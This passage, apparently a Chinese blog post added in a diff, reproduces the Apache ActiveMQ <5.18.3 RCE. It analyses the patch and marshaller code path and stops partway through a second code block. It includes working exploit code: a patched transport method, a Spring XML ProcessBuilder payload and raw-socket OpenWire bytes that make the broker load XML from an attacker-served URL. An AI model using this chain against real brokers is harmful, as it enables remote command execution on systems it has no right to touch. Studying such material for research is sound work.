@@ -1,0 +1,1019 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Zer0peach">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Apache ActiveMQ&lt;5.18.3的RCE前言再写春秋杯Active-takeaway时遇到ActiveMQ，来复现一下，之前只是粗略的看了下文章 学习就应该这样，刷题-&gt;不会-&gt;看WP-&gt;深入了解，但我真刷题太少了 复现的是https:&#x2F;&#x2F;exp10it.io&#x2F;2023&#x2F;10&#x2F;apache-activemq-%E7%89%88%E6%9C%AC-5.18.3-r">
+<meta property="og:type" content="article">
+<meta property="og:title" content="学习ActiveMQ小于5.18.3的RCE">
+<meta property="og:url" content="https://zer0peach.github.io/2024/02/09/%E5%AD%A6%E4%B9%A0ActiveMQ%E5%B0%8F%E4%BA%8E5-18-3%E7%9A%84RCE/index.html">
+<meta property="og:site_name" content="Zer0peach can&#39;t think">
+<meta property="og:description" content="Apache ActiveMQ&lt;5.18.3的RCE前言再写春秋杯Active-takeaway时遇到ActiveMQ，来复现一下，之前只是粗略的看了下文章 学习就应该这样，刷题-&gt;不会-&gt;看WP-&gt;深入了解，但我真刷题太少了 复现的是https:&#x2F;&#x2F;exp10it.io&#x2F;2023&#x2F;10&#x2F;apache-activemq-%E7%89%88%E6%9C%AC-5.18.3-r">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E5%AD%A6%E4%B9%A0ActiveMQ%E5%B0%8F%E4%BA%8E5-18-3%E7%9A%84RCE/image-20240209031227613.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E5%AD%A6%E4%B9%A0ActiveMQ%E5%B0%8F%E4%BA%8E5-18-3%E7%9A%84RCE/image-20240209031114440.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E5%AD%A6%E4%B9%A0ActiveMQ%E5%B0%8F%E4%BA%8E5-18-3%E7%9A%84RCE/image-20240209015429655.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E5%AD%A6%E4%B9%A0ActiveMQ%E5%B0%8F%E4%BA%8E5-18-3%E7%9A%84RCE/image-20240209024630931.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E5%AD%A6%E4%B9%A0ActiveMQ%E5%B0%8F%E4%BA%8E5-18-3%E7%9A%84RCE/image-20240209024904937.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E5%AD%A6%E4%B9%A0ActiveMQ%E5%B0%8F%E4%BA%8E5-18-3%E7%9A%84RCE/image-20240209024942697.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E5%AD%A6%E4%B9%A0ActiveMQ%E5%B0%8F%E4%BA%8E5-18-3%E7%9A%84RCE/image-20240209024953849.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E5%AD%A6%E4%B9%A0ActiveMQ%E5%B0%8F%E4%BA%8E5-18-3%E7%9A%84RCE/image-20240209025700540.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E5%AD%A6%E4%B9%A0ActiveMQ%E5%B0%8F%E4%BA%8E5-18-3%E7%9A%84RCE/image-20240210021631594.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E5%AD%A6%E4%B9%A0ActiveMQ%E5%B0%8F%E4%BA%8E5-18-3%E7%9A%84RCE/image-20240210021838401.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E5%AD%A6%E4%B9%A0ActiveMQ%E5%B0%8F%E4%BA%8E5-18-3%E7%9A%84RCE/image-20240210022735896.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E5%AD%A6%E4%B9%A0ActiveMQ%E5%B0%8F%E4%BA%8E5-18-3%E7%9A%84RCE/image-20240210022624732.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E5%AD%A6%E4%B9%A0ActiveMQ%E5%B0%8F%E4%BA%8E5-18-3%E7%9A%84RCE/image-20240210023057935.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E5%AD%A6%E4%B9%A0ActiveMQ%E5%B0%8F%E4%BA%8E5-18-3%E7%9A%84RCE/image-20240211014512696.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E5%AD%A6%E4%B9%A0ActiveMQ%E5%B0%8F%E4%BA%8E5-18-3%E7%9A%84RCE/image-20240211024029722.png">
+<meta property="article:published_time" content="2024-02-08T17:41:09.000Z">
+<meta property="article:modified_time" content="2024-02-10T19:02:18.958Z">
+<meta property="article:author" content="Zer0peach">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://zer0peach.github.io/images/%E5%AD%A6%E4%B9%A0ActiveMQ%E5%B0%8F%E4%BA%8E5-18-3%E7%9A%84RCE/image-20240209031227613.png">
+  
+  
+  
+  <title>学习ActiveMQ小于5.18.3的RCE - Zer0peach can&#39;t think</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"zer0peach.github.io","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":true,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Zer0peach&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="学习ActiveMQ小于5.18.3的RCE"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-02-09 01:41" pubdate>
+          2024年2月9日 凌晨
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          14k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          117 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">学习ActiveMQ小于5.18.3的RCE</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="Apache-ActiveMQ"><a href="#Apache-ActiveMQ" class="headerlink" title="Apache ActiveMQ&lt;5.18.3的RCE"></a>Apache ActiveMQ&lt;5.18.3的RCE</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>再写春秋杯Active-takeaway时遇到ActiveMQ，来复现一下，之前只是粗略的看了下文章</p>
+<p>学习就应该这样，刷题-&gt;不会-&gt;看WP-&gt;深入了解，但我真刷题太少了</p>
+<p>复现的是<a target="_blank" rel="noopener" href="https://exp10it.io/2023/10/apache-activemq-%E7%89%88%E6%9C%AC-5.18.3-rce-%E5%88%86%E6%9E%90/">https://exp10it.io/2023/10/apache-activemq-%E7%89%88%E6%9C%AC-5.18.3-rce-%E5%88%86%E6%9E%90/</a></p>
+<h2 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h2><p>了解下概念</p>
+<p><img src="/../images/%E5%AD%A6%E4%B9%A0ActiveMQ%E5%B0%8F%E4%BA%8E5-18-3%E7%9A%84RCE/image-20240209031227613.png" srcset="/img/loading.gif" lazyload alt="image-20240209031227613"></p>
+<p><img src="/../images/%E5%AD%A6%E4%B9%A0ActiveMQ%E5%B0%8F%E4%BA%8E5-18-3%E7%9A%84RCE/image-20240209031114440.png" srcset="/img/loading.gif" lazyload alt="image-20240209031114440"></p>
+<p>爆出一个项目有漏洞后，找漏洞点最好的方式就是去diff，看看官方是咋修补的</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/apache/activemq/commit/958330df26cf3d5cdb63905dc2c6882e98781d8f">https://github.com/apache/activemq/commit/958330df26cf3d5cdb63905dc2c6882e98781d8f</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/apache/activemq/blob/1d0a6d647e468334132161942c1442eed7708ad2/activemq-openwire-legacy/src/main/java/org/apache/activemq/openwire/v4/ExceptionResponseMarshaller.java">https://github.com/apache/activemq/blob/1d0a6d647e468334132161942c1442eed7708ad2/activemq-openwire-legacy/src/main/java/org/apache/activemq/openwire/v4/ExceptionResponseMarshaller.java</a></p>
+<p><img src="/../images/%E5%AD%A6%E4%B9%A0ActiveMQ%E5%B0%8F%E4%BA%8E5-18-3%E7%9A%84RCE/image-20240209015429655.png" srcset="/img/loading.gif" lazyload alt="image-20240209015429655"></p>
+<p>发现可以实例化任意构造器，并传入String类的参数</p>
+<p>看一下这个类结构</p>
+<p><img src="/../images/%E5%AD%A6%E4%B9%A0ActiveMQ%E5%B0%8F%E4%BA%8E5-18-3%E7%9A%84RCE/image-20240209024630931.png" srcset="/img/loading.gif" lazyload alt="image-20240209024630931"></p>
+<p>有若干 Marshal&#x2F;unmarshal 方法     （即序列化和反序列化</p>
+<p>找一下调用漏洞函数的部分</p>
+<p><img src="/../images/%E5%AD%A6%E4%B9%A0ActiveMQ%E5%B0%8F%E4%BA%8E5-18-3%E7%9A%84RCE/image-20240209024904937.png" srcset="/img/loading.gif" lazyload alt="image-20240209024904937"></p>
+<p>有两处地方调用了这个函数</p>
+<p><img src="/../images/%E5%AD%A6%E4%B9%A0ActiveMQ%E5%B0%8F%E4%BA%8E5-18-3%E7%9A%84RCE/image-20240209024942697.png" srcset="/img/loading.gif" lazyload alt="image-20240209024942697"></p>
+<p><img src="/../images/%E5%AD%A6%E4%B9%A0ActiveMQ%E5%B0%8F%E4%BA%8E5-18-3%E7%9A%84RCE/image-20240209024953849.png" srcset="/img/loading.gif" lazyload alt="image-20240209024953849"></p>
+<p>这里以tightUnmarsalThrowable为例</p>
+<p>会通过反序列化获取 clazz 和 message, 然后调用 createThrowable</p>
+<p>找到与tightUnmarsalThrowable对应的tightMarshalThrowable</p>
+<p><img src="/../images/%E5%AD%A6%E4%B9%A0ActiveMQ%E5%B0%8F%E4%BA%8E5-18-3%E7%9A%84RCE/image-20240209025700540.png" srcset="/img/loading.gif" lazyload alt="image-20240209025700540"></p>
+<p>文章的前文提到</p>
+<blockquote>
+<p>经过简单的搜索可以发现 ExceptionResponseMarshaller 这个类, 它是 BaseDataStreamMarshaller 的子类</p>
+<p>其 tightUnmarshal&#x2F;looseUnmarshal 方法会调用 tightMarshalThrowable&#x2F;looseMarshalThrowable, 最终调用到 BaseDataStreamMarshaller 的 createThrowable 方法</p>
+</blockquote>
+<p>。。。6</p>
+<div class="code-wrapper"><pre><code class="hljs aspectj"><span class="hljs-keyword">package</span> org.apache.activemq.command;
+
+<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ExceptionResponse</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Response</span> </span>&#123;
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">byte</span> DATA_STRUCTURE_TYPE = <span class="hljs-number">31</span>;
+    Throwable exception;
+
+    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">ExceptionResponse</span><span class="hljs-params">()</span> </span>&#123;
+    &#125;
+
+    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">ExceptionResponse</span><span class="hljs-params">(Throwable e)</span> </span>&#123;
+        <span class="hljs-keyword">this</span>.setException(e);
+    &#125;
+
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">byte</span> <span class="hljs-title">getDataStructureType</span><span class="hljs-params">()</span> </span>&#123;
+        <span class="hljs-keyword">return</span> <span class="hljs-number">31</span>;
+    &#125;
+
+    <span class="hljs-keyword">public</span> <span class="hljs-function">Throwable <span class="hljs-title">getException</span><span class="hljs-params">()</span> </span>&#123;
+        <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.exception;
+    &#125;
+
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">setException</span><span class="hljs-params">(Throwable exception)</span> </span>&#123;
+        <span class="hljs-keyword">this</span>.exception = exception;
+    &#125;
+
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">boolean</span> <span class="hljs-title">isException</span><span class="hljs-params">()</span> </span>&#123;
+        <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;
+    &#125;
+&#125;</code></pre></div>
+
+<p>回到上面</p>
+<p>o 就是 ExceptionResponse 里面的 exception 字段 (继承了 Throwable), 然后分别将 o 的 className 和 message 写入序列化流</p>
+<p>到这里思路其实已经差不多了, 我们只需要构造一个 ExceptionResponse 然后发给 ActiveMQ 服务器, 之后 ActiveMQ 会自己调用 unmarshal, 最后触发 createThrowable</p>
+<p>下面只需要关注如何发送 ExceptionResponse 即可</p>
+<p>只能说太强了</p>
+<p>写一个发送信息的demo</p>
+<div class="code-wrapper"><pre><code class="hljs pgsql">package com.example;
+
+<span class="hljs-keyword">import</span> org.apache.activemq.ActiveMQConnectionFactory;
+
+<span class="hljs-keyword">import</span> javax.jms.*;
+
+<span class="hljs-built_in">public</span> <span class="hljs-keyword">class</span> Demo &#123;
+    <span class="hljs-built_in">public</span> static <span class="hljs-type">void</span> main(String[] args) throws <span class="hljs-keyword">Exception</span> &#123;
+
+        ConnectionFactory connectionFactory = <span class="hljs-built_in">new</span> ActiveMQConnectionFactory(&quot;tcp://localhost:61616&quot;);
+        <span class="hljs-keyword">Connection</span> <span class="hljs-keyword">connection</span> = connectionFactory.createConnection();
+        <span class="hljs-keyword">connection</span>.<span class="hljs-keyword">start</span>();
+        <span class="hljs-keyword">Session</span> <span class="hljs-keyword">session</span> = <span class="hljs-keyword">connection</span>.createSession();
+        Destination destination = <span class="hljs-keyword">session</span>.createQueue(&quot;tempQueue&quot;);
+
+        MessageProducer producer = <span class="hljs-keyword">session</span>.createProducer(destination);
+        Message message = <span class="hljs-keyword">session</span>.createObjectMessage(&quot;123&quot;);
+        producer.send(message);
+
+        <span class="hljs-keyword">connection</span>.<span class="hljs-keyword">close</span>();
+    &#125;
+&#125;</code></pre></div>
+
+<p>然后随便打几个断点</p>
+<p>在一次通信的过程中 ActiveMQ 会 marshal &#x2F; unmarshal 一些其它的数据, 调试的时候记得判断)</p>
+<p><code>org.apache.activemq.openwire.OpenWireFormat#doUnmarshal()</code></p>
+<p>这里会获取dataType，然后根据它的值去获取对应的序列化器</p>
+<p><img src="/../images/%E5%AD%A6%E4%B9%A0ActiveMQ%E5%B0%8F%E4%BA%8E5-18-3%E7%9A%84RCE/image-20240210021631594.png" srcset="/img/loading.gif" lazyload alt="image-20240210021631594"></p>
+<p>在 demo 中我们发送的是一个 ObjectMessage (ActiveMQObjectMessage) 对象, 它的 dataType 是 26</p>
+<p>而 ExceptionResponse 的 dataType 是 31, 对应上图中的 ExceptionResponseMarshaller</p>
+<p>获取到了对应的序列化器之后, 会调用它的 tightUnmarshal &#x2F; looseUnmarshal 方法进一步处理 Message 内容</p>
+<p><img src="/../images/%E5%AD%A6%E4%B9%A0ActiveMQ%E5%B0%8F%E4%BA%8E5-18-3%E7%9A%84RCE/image-20240210021838401.png" srcset="/img/loading.gif" lazyload alt="image-20240210021838401"></p>
+<p>不能修改 ObjectMessage 的 <code>DATA_STRUCTURE_TYPE</code> 字段, 把它改成 31 然后发送</p>
+<p> 因为对于不同的 Message 类型, 序列化器会单独进行处理, 比如调用 writeXXX 和 readXXX 的类型和次数都不一样</p>
+<p>我们应该发送一个经由这个 ExceptionResponseMarshaller 处理的 ExceptionResponse</p>
+<p>这里X1r0z师傅的非常厉害，因为要doUnmarshal中readByte获取dataType</p>
+<p>所以在marshal中下断点，调试client端</p>
+<p>然后在调用栈中往前找到了TcpTransport类</p>
+<p><img src="/../images/%E5%AD%A6%E4%B9%A0ActiveMQ%E5%B0%8F%E4%BA%8E5-18-3%E7%9A%84RCE/image-20240210022735896.png" srcset="/img/loading.gif" lazyload alt="image-20240210022735896"></p>
+<p><img src="/../images/%E5%AD%A6%E4%B9%A0ActiveMQ%E5%B0%8F%E4%BA%8E5-18-3%E7%9A%84RCE/image-20240210022624732.png" srcset="/img/loading.gif" lazyload alt="image-20240210022624732"></p>
+<p>它的 oneway 方法会调用 wireFormat.marshal() 去序列化 command</p>
+<p>command 就是前面准备发送的 ObjectMessage, 而 wireFormat 就是和它对应的序列化器</p>
+<p>那么我们只需要手动 patch 这个方法, 将 command 改成 ExceptionResponse, 将 wireFormat 改成 ExceptionResponseMarshaller 即可</p>
+<p>这里师傅没管OpenWire 协议，直接在当前源码目录重写了TcpTransport类的逻辑</p>
+<div class="code-wrapper"><pre><code class="hljs java">
+<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">oneway</span><span class="hljs-params">(Object command)</span> <span class="hljs-keyword">throws</span> IOException &#123;
+    <span class="hljs-built_in">this</span>.checkStarted();
+    <span class="hljs-type">Throwable</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassPathXmlApplicationContext</span>(<span class="hljs-string">&quot;http://127.0.0.1:8000/poc.xml&quot;</span>);
+    <span class="hljs-type">ExceptionResponse</span> <span class="hljs-variable">response</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ExceptionResponse</span>(obj);
+   <span class="hljs-built_in">this</span>.wireFormat.marshal(response, <span class="hljs-built_in">this</span>.dataOut);
+    <span class="hljs-built_in">this</span>.dataOut.flush();
+&#125;</code></pre></div>
+
+
+
+<p>然后是 createThrowable 方法的利用, 这块其实跟 PostgreSQL JDBC 的利用类似, 因为 ActiveMQ 自带 spring 相关依赖, 那么就可以利用 <code>ClassPathXmlApplicationContext</code> 加载 XML 实现 RCE</p>
+<p>因为在 marshal 的时候会调用 <code>o.getClass().getName()</code> 获取类名, 而 getClass 方法无法重写 (final), 所以在这里同样 patch 了 <code>org.springframework.context.support.ClassPathXmlApplicationContext</code>, 使其继承 Throwable 类</p>
+<p>大佬的思路总是惊为天人</p>
+<p><img src="/../images/%E5%AD%A6%E4%B9%A0ActiveMQ%E5%B0%8F%E4%BA%8E5-18-3%E7%9A%84RCE/image-20240210023057935.png" srcset="/img/loading.gif" lazyload alt="image-20240210023057935"></p>
+<div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span> ?&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">beans</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span></span>
+<span class="hljs-tag">       <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span>
+<span class="hljs-tag">       <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;</span></span>
+<span class="hljs-string"><span class="hljs-tag">     http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;pb&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span> <span class="hljs-attr">init-method</span>=<span class="hljs-string">&quot;start&quot;</span>&gt;</span>
+            <span class="hljs-tag">&lt;<span class="hljs-name">constructor-arg</span> &gt;</span>
+            <span class="hljs-tag">&lt;<span class="hljs-name">list</span>&gt;</span>
+                <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>open<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span>
+                <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>-a<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span>
+                <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>calculator<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span>
+            <span class="hljs-tag">&lt;/<span class="hljs-name">list</span>&gt;</span>
+            <span class="hljs-tag">&lt;/<span class="hljs-name">constructor-arg</span>&gt;</span>
+        <span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span>
+    <span class="hljs-tag">&lt;/<span class="hljs-name">beans</span>&gt;</span></code></pre></div>
+
+<h2 id="续集"><a href="#续集" class="headerlink" title="续集"></a>续集</h2><p>复现春秋杯时，看Boogipop大佬WP给出一个链接</p>
+<p><a target="_blank" rel="noopener" href="https://www.yulegeyu.com/">雨了个雨’s blog (yulegeyu.com)</a></p>
+<p>也谈了对这个rce的理解</p>
+<p>正常场景下，生产者只能发送Message给Broker。为了发送Response给Broker肯定需要修改下ActiveMQ的代码，所以大部分利用都是修改代码实现的。</p>
+<p>然后作者查看了Activemq的协议，给出了攻击代码</p>
+<div class="code-wrapper"><pre><code class="hljs reasonml">ByteArrayOutputStream bos = <span class="hljs-keyword">new</span> <span class="hljs-constructor">ByteArrayOutputStream()</span>;
+DataOutput dataOutput = <span class="hljs-keyword">new</span> <span class="hljs-constructor">DataOutputStream(<span class="hljs-params">bos</span>)</span>;
+dataOutput.write<span class="hljs-constructor">Int(0)</span>;
+dataOutput.write<span class="hljs-constructor">Byte(31)</span>;
+
+dataOutput.write<span class="hljs-constructor">Int(1)</span>;
+dataOutput.write<span class="hljs-constructor">Boolean(<span class="hljs-params">true</span>)</span>;
+dataOutput.write<span class="hljs-constructor">Int(1)</span>;
+dataOutput.write<span class="hljs-constructor">Boolean(<span class="hljs-params">true</span>)</span>;
+dataOutput.write<span class="hljs-constructor">Boolean(<span class="hljs-params">true</span>)</span>;
+dataOutput.write<span class="hljs-constructor">UTF(<span class="hljs-string">&quot;org.springframework.context.support.ClassPathXmlApplicationContext&quot;</span>)</span>;
+dataOutput.write<span class="hljs-constructor">Boolean(<span class="hljs-params">true</span>)</span>;
+dataOutput.write<span class="hljs-constructor">UTF(<span class="hljs-string">&quot;http://localhost:8000/abcd&quot;</span>)</span>;
+
+Socket socket = <span class="hljs-keyword">new</span> <span class="hljs-constructor">Socket(<span class="hljs-string">&quot;localhost&quot;</span>, 61616)</span>;
+OutputStream socketOutputStream = socket.get<span class="hljs-constructor">OutputStream()</span>;
+socketOutputStream.write(bos.<span class="hljs-keyword">to</span><span class="hljs-constructor">ByteArray()</span>);
+socketOutputStream.close<span class="hljs-literal">()</span>;</code></pre></div>
+
+<p>socket连接后，根据反序列化逻辑的代码，对应着进行writeInt、writeByte、writeBoolean</p>
+<p>省去发送message过程中marshal的操作，直接进行dounmarshal</p>
+<p>此外作者发现ActiveMQ中存在一个tightEncodingEnabled的配置，启用tightEncodingEnabled配置后，ActiveMQ会使用一种紧凑的消息编码方式，它采用了一些技巧，例如采用更紧凑的数据结构、二进制编码等，以减少消息的大小。</p>
+<p>很明显如果目标启用了tightEncodingEnabled的话，上面的攻击代码肯定需要修改。经过测试发现默认Broker未打开该配置，Consumer打开该配置。</p>
+<p>这里也给出tightEncodingEnabled场景下，攻击Broker的利用代码</p>
+<div class="code-wrapper"><pre><code class="hljs reasonml">ByteArrayOutputStream bos = <span class="hljs-keyword">new</span> <span class="hljs-constructor">ByteArrayOutputStream()</span>;
+DataOutput dataOutput = <span class="hljs-keyword">new</span> <span class="hljs-constructor">DataOutputStream(<span class="hljs-params">bos</span>)</span>;
+dataOutput.write<span class="hljs-constructor">Int(0)</span>;
+dataOutput.write<span class="hljs-constructor">Byte(31)</span>;
+
+BooleanStream bs = <span class="hljs-keyword">new</span> <span class="hljs-constructor">BooleanStream()</span>;
+bs.write<span class="hljs-constructor">Boolean(<span class="hljs-params">true</span>)</span>;
+bs.write<span class="hljs-constructor">Boolean(<span class="hljs-params">true</span>)</span>;
+bs.write<span class="hljs-constructor">Boolean(<span class="hljs-params">true</span>)</span>;
+bs.write<span class="hljs-constructor">Boolean(<span class="hljs-params">false</span>)</span>;
+bs.write<span class="hljs-constructor">Boolean(<span class="hljs-params">true</span>)</span>;
+bs.write<span class="hljs-constructor">Boolean(<span class="hljs-params">false</span>)</span>;
+
+bs.marshal(dataOutput);
+
+dataOutput.write<span class="hljs-constructor">UTF(<span class="hljs-string">&quot;bb&quot;</span>)</span>;
